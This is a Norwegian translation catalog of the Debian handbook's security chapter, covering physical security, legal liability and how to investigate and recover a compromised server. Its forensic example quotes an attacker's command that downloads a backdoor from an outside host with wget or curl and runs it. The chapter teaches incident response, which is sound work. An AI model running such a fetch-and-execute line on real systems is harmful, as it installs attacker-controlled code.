Repository: Debian-VN/debian-handbook
Catalog: */14_security.po
Languages: nb_no

source: There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated.
nb_no: Det er ingen vits i å sikre tjenester og nettverk hvis datamaskinene selv ikke er beskyttet. Viktige data fortjener å bli lagret på varm-pluggede harddisker i RAID-områder, fordi harddisker mislykkes til slutt og datatilgjengelighet er et must. Men hvis et pizzabud kan gå inn i bygningen, snike seg inn i tjenerrommet og snike seg ut med noen få utvalgte harddisker, er en viktig del av sikkerheten ikke dekket. Hvem kan gå inn i tjenerrommet ? Er tilgangen overvåket? Disse spørsmålene fortjener overveielse (og svar) når den fysiske sikkerheten blir vurdert.

source: Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox.
nb_no: Fysisk sikkerhet omfatter også risikoen for ulykker som branner. Denne risikoen berettiger lagring av sikkerhetskopier i en egen bygning, eller i det minste i et brannsikkert skap.

source: Legal Liability
nb_no: Juridisk ansvar

source: An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit.
nb_no: En administrator har, mer eller mindre implisitt, tillit hos sine brukere, samt brukere av nettverket generelt. En bør derfor unngå enhver uaktsomhet som ondsinnede mennesker kan utnytte.

source: An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine.
nb_no: En angriper som tar kontroll over maskinen din for så bruke det som en fremskutt base (kjent som et "stafettsystem") for derfra å utføre andre ulovlige aktiviteter. kan føre til juridiske problemer for deg, siden den angrepne i utgangspunktet vil se angrepet komme fra ditt system, og derfor anser deg som angriper (eller som medskyldig). I mange tilfelle kan en angriper bruke din tjener som en mulighet til å sende spam, som ikke bør ha mye innvirkning (unntatt en mulig registrering på svartelister som kan begrense din mulighet til å sende legitime e-poster), men det vil likevel ikke være hyggelig. I andre tilfelle kan større problemer forårsakes fra maskinen, for eksempel tjenestenekt-angrep. Dette vil noen ganger forårsake tap av inntekter, ettersom de legitime tjenestene vil være utilgjengelige, og data kan bli ødelagt; Noen ganger vil dette også innebære en reell kostnad, fordi den angrepne part kan starte søksmål mot deg. Rettighetshavere kan saksøke deg hvis en uautorisert kopi av et verk, beskyttet av opphavsrett deles fra tjeneren din, så vel som at andre selskaper tvinges av servicenivå-avtaler dersom de er forpliktet til å betale erstatning etter angrep fra din maskinen.

source: When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks.
nb_no: Når slike situasjoner oppstår, er det vanligvis ikke nok å hevde uskyld; I det minste, trenger du overbevisende bevis som viser mistenkelig aktivitet på systemet ditt kommer fra en gitt IP-adresse. Dette vil ikke være mulig hvis du forsømmer anbefalingene i kapittelet her og lar angriperen få tilgang til en privilegert konto (spesielt rot) og bruker den til å dekke sine spor.

source: Dealing with a Compromised Machine
nb_no: Å håndtere en kompromittert maskin

source: Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances.
nb_no: Til tross for de beste intensjoner og et nøye utformet sikkerhetsopplegg, kan en administrator likevel stå ansikt til ansikt med en kapring. Denne seksjonen inneholder noen veiledninger om hvordan man skal reagere konfrontert med slike uheldige omstendigheter.

source: Detecting and Seeing the Cracker's Intrusion
nb_no: Avdekke å se innbruddet

source: The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure.
nb_no: Det første skrittet for å reagere mot et innbrudd er å bli oppmerksom på en slik handling. Dette er ikke selvinnlysende, spesielt uten et tilstrekkelig infrastruktur for overvåking.

source: Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:
nb_no: Innbruddshandlinger oppdages ofte ikke før de har direkte konsekvenser på de legitime tjenestene på vertsmaskinen, for eksempel at tilkoblinger bremses ned, noen brukere ikke klarer å koble til, eller noen annen form for feil. Konfrontert med disse problemene, må administratoren å ta et god titt på maskinen og nøye granske hva den feiler. Dette er vanligvis den tidspunktet da man oppdager en uvanlig prosess, for eksempel en som heter <literal>apache</literal> i stedet for standarden <literal>/usr/sbin/apache2</literal>. Hvis vi følger dette eksemplet, er tingen å gjøre å være oppmerksom på prosess-identifisereren, og sjekk <filename>/proc/<replaceable>pid</replaceable>/exe</filename> for å se hvilket program denne prosessen kjører for øyeblikket:

source: A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised.
nb_no: KIjører et prfogram installert under <filename>/var/tmp/</filename> som en nettjener? Ingen tvil igjen, maskinen er kompromittert.

source: This is only one example, but many other hints can ring the administrator's bell:
nb_no: Dette er bare ett eksempel, men mange andre tips kan få det til å ringe i administratorens bjelle:

source: an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;
nb_no: et alternativ til en kommando som ikke lenger fungerer; versjonen av programvaren som kommandoen hevder å være, samsvarer ikke med den versjonen som den er ment å være installert i samsvar med <command>dpkg</command>;

source: a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;
nb_no: en ledetekst eller en økt-hilsen som indikerer at den siste forbindelsen kom fra en ukjent tjener på et annet kontinent;

source: errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;
nb_no: feil forårsake av at <filename>/tmp/</filename>-partisjon er full, noe som viste seg å være med ulovlige kopierte filmer;

source: and so on.
nb_no: og så videre.

source: Putting the Server Off-Line
nb_no: Å sette tjeneren Off-Line

source: In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet.
nb_no: I alle, bortsett fra de mest eksotiske tilfelle, kommer innbrudd fra nettverket, og angriperen trenger et fungerende nettverk for å nå sine mål (tilgang til konfidensielle data, deling av ulovlige filer, skjuling av sin identitet ved å bruke maskinen som til stafett, og så videre). Å ta datamaskinen av nettverket vil hindre angriperen fra å nå disse målene, hvis denne ikke har klart å gjøre det allerede.

source: This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> and <xref linkend="sect.reconstituting-the-attack-scenario" />), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines.
nb_no: Dette kan bare være mulig hvis tjeneren er fysisk tilgjengelig. Når tjeneren leier plas hos en vertsleverandør på en annen kant av landet, eller hvis tjeneren ikke er tilgjengelig for noen annen grunn, er det vanligvis en god idé å starte med å samle viktig informasjon (se <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />, <xref linkend="sect.forensic-analysis" /> og <xref linkend="sect.reconstituting-the-attack-scenario" />), deretter å isolere denne tjeneren så mye som mulig ved å lukke så mange tjenester som mulig (vanligvis, alt untatt <command>sshd</command>). Denne saken er fortsatt vanskelig, siden man ikke kan utelukke muligheten for at angriperen har samme SSH-tilgang som administratoren har; Dette gjør det vanskeligere å "rense" maskinene.

source: Keeping Everything that Could Be Used as Evidence
nb_no: Beholde alt som kan brukes som bevis

source: Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice.
nb_no: Å forstå angrep og/eller vinne søksmål mot angriperne forutsetter å ta kopier av alle viktige elementer; medregnet innholdet på harddisken, en liste over alle prosesser som kjører, og en liste over alle åpne tilkoblinger. Innholdet i RAM kan også benyttes, men det er sjelden brukt i praksis.

source: In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down.
nb_no: I sakens hete, er administratorer ofte fristet til å utføre mange kontroller av den kompromitterte maskinen; Det er vanligvis ikke en god idé. Hver kommando er potensielt skadelig og kan slette deler av bevis. Kontrollene bør begrenses til minimumssettet, (<command>netstat -tupan</command> for nettverksforbindelser, <command>ps auxf</command> for en liste med prosesser, <command>ls -alR /proc/[0-9]*</command> for litt mer informasjon om programmer som kjører), og hver utført sjekk bør omsorgsfullt skrives ned.

source: <emphasis>CAUTION</emphasis> Hot analysis
nb_no: <emphasis>CAUTION</emphasis> Varm analyse

source: While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!
nb_no: Mens det kan virke fristende å analysere systemet mens det går, spesielt når en ikke er i fysisk kontakt med tjeneren, er dette best at dette unngås: Rett og slett at du ikke kan stole på de programmene som er installert på den kompromitterte systemet. Det er fullt mulig for en skadelig <command>ps</command>-kommando å skjule noen prosesser, eller for en skadelig <command>ls</command> å skjule filer; noen ganger kan til og med kjernen være kompromittert!

source: If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised.
nb_no: Dersom en slik varm analyse er fortsatt nødvendig, bør man sørge for å bare bruke godt kjente programmer. En god måte å gjøre det ville være å ha en rednings-CD med uberørte programmer eller en skrivebeskyttet nettverksressurs. Imidlertid kan selv disse mottiltak ikke være nok hvis kjernen selv er kompromittert.

source: Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled.
nb_no: Når de "dynamiske" elementer ha blitt lagret, er neste steg å lagre et komplett bilde av harddisken. Å lage et slikt bilde er umulig hvis filsystemet er fortsatt utvikles, og det er derfor det må monteres om skrivebeskyttet . Den enkleste løsningen er ofte å stoppe tjeneren brutalt (etter å ha kjørt <command>sync</command>) og starte den på nytt med en rednings-CD. Hver partisjon skal kopieres med et verktøy som <command>dd</command>; Disse bildene kan sendes til en annen tjener (muligens med det veldig praktiske <command>nc</command>-verktøyet). En annen mulighet kan være enda enklere: Bare få disken ut av maskinen og erstatt den med en ny en som kan formateres og reinstalleres.

source: Re-installing
nb_no: Reinstallering

source: The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we get rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates.
nb_no: Tjeneren skal ikke bringes tilbake i drift uten en fullstendig reinstallasjon. Dersom skaden var alvorlig (hvis administrative rettigheter lakk ut), er det nesten ingen annen måte å være sikker på at vi blir kvitt alt angriperen kan ha etterlatt seg (spesielt <emphasis>backdoors</emphasis>). Selvfølgelig må alle de nyeste sikkerhetsoppdateringene benyttes, slik som å plugge den sårbarheten som brukes av angriperen. Ideelt, å analysere angrepet skal peke på denne angrepsmetoden, slik at man faktisk kan være sikker på å få fikset den. Ellers kan man bare håpe at sårbarheten var en av de som er ordnet via oppdateringene.

source: Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media.
nb_no: Å installere en ekstern tjener er ikke alltid lett; det kan innebære bistand fra vertselskapet, fordi ikke alle slike selskaper tilbyr automatiserte reinstalleringsystemer. Forsiktighet bør utvises for ikke å reinstallere maskinen fra sikkerhetskopier tatt opp etter kompromitteringen. Ideelt sett bør kun data gjenopprettes, selve programvaren må installeres på nytt fra installasjonsmediet .

source: Forensic Analysis
nb_no: Rettslig analyse

source: Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake.
nb_no: Nå som tjenesten er gjenopprettet, er det på tide å se nærmere på diskbilder av det kompromitterte systemet for å forstå angrepsmetoden. Ved montering disse bildene, man sørge for å bruke <literal>ro,nodev,noexec,noatime</literal>-alternativene for å unngå å endre innholdet (inkludert tidsstempler for tilgangen til filer) eller å kjøre kompromitterte programmer ved en feiltakelse.

source: Retracing an attack scenario usually involves looking for everything that was modified and executed:
nb_no: Å gjennomgå et angrepsscenario innebærer vanligvis å leter etter alt som ble endret og kjørt:

source: <filename>.bash_history</filename> files often provide for a very interesting read;
nb_no: Å lese <filename>.bash_history</filename>-filer ofte svært interessant;

source: so does listing files that were recently created, modified or accessed;
nb_no: det gjør også listing av filer som nylig ble opprettet, endret eller åpnet;

source: the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;
nb_no: <command>strings</command>-kommandoen kan være til hjelp med å identifisere programmer installert av angriperen, ved å ekstrahere strenger fra binærfiler;

source: the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;
nb_no: Loggfilene i <filename>/var/log/</filename> gjør det ofte mulig å rekonstruere hendelsesrekkefølgen;

source: special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete.
nb_no: verktøy for spesielle formål tillater også gjenoppretting av innholdet i potensielt slettede filer, medregnet loggfiler som angripere ofte sletter.

source: Some of these operations can be made easier with specialized software. In particular, the <emphasis role="pkg">sleuthkit</emphasis> package provides many tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package).
nb_no: Noen av disse operasjonene kan gjøres enklere med spesialisert programvare. Spesielt <emphasis role="pkg">sleuthkit</emphasis>-pakken inneholder mange verktøy for å analysere et filsystem. Bruken er gjort enklere med <emphasis>Autopsy Forensic Browser</emphasis>-grafiske grensesnitt (i <emphasis role="pkg">autopsy</emphasis>-pakken).

source: Reconstituting the Attack Scenario
nb_no: Å rekonstruere et angrepscenario

source: All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings.
nb_no: Alle elementene samlet under analysen skal passe sammen som brikker i et puslespill; Etableringen av de første mistenkelige filer, er ofte korrelert med logger som beviser brudd. En virkelig eksempel bør være tydeligere enn lange teoretiske skriblinger.

source: The following log is an extract from an Apache <filename>access.log</filename>:
nb_no: Den følgende loggen er et utdrag fra en Apache <filename>access.log</filename>:

source: This example matches exploitation of an old security vulnerability in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
nb_no: Dette eksemplet samsvarer med en utnyttelse av et gammelt sikkerhetsproblem i phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />

source: Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor.
nb_no: Å dekode denne lange URL-en fører til at en forstår at angriperen klarte å kjøre noe PHP-kode, nemlig: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Selvfølgelig, en <filename>bd</filename>-fil ble funnet i <filename>/tmp/</filename>. Å kjøre <command>strings /mnt/tmp/bd</command> returnerer, blant andre strenger, <literal>PsychoPhobia Backdoor is starting...</literal>. Dette ser virkelig ut som en bakdør.
